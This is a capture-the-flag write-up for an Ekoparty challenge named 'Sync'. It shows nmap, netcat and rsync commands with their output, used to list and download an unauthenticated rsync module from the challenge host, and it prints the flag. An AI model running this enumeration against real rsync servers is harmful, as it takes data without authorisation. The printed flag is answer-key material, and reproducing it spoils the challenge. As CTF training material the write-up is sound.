# Sync

## Description

![sync-1](/assets/ctf/ekoparty/sync-1.png)

## Solution

Identify port:

```bash
└─$ nmap go.ctf.site -p 10873 -Pn -sC -sV -A 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-03 22:46 +04
Nmap scan report for go.ctf.site (3.95.96.204)
Host is up (0.15s latency).
rDNS record for 3.95.96.204: ec2-3-95-96-204.compute-1.amazonaws.com

PORT      STATE SERVICE VERSION
10873/tcp open  rsync   (protocol version 31)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.55 seconds
```

[Hacktricks: 873 pentesting rsync](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync)

```bash
└─$ nc -v go.ctf.site 10873            
go.ctf.site [3.95.96.204] 10873 open
@RSYNCD: 31.0 
@RSYNCD: 31.0 # <--- Send
#list         # <--- Show available shared folders
code           	MJ Code
@RSYNCD: EXIT
                                                                                            
└─$ rsync -av rsync://go.ctf.site:10873/code ./code # Download      
receiving incremental file list
created directory ./code
./
.flag.txt

sent 46 bytes  received 151 bytes  26.27 bytes/sec
total size is 31  speedup is 0.16
                                                                                           
└─$ la code # Flag is hidden file
Permissions Size User  Date Modified Name
.rw-rw-r--    31 woyag 22 Oct 20:24   .flag.txt
                                                                                            
└─$ cat ./code/.flag.txt # Profit
EKO{rsync_&_critical_inf0_FTW}                                                                                     
```
::: tip Flag
`EKO{rsync_&_critical_inf0_FTW}`
:::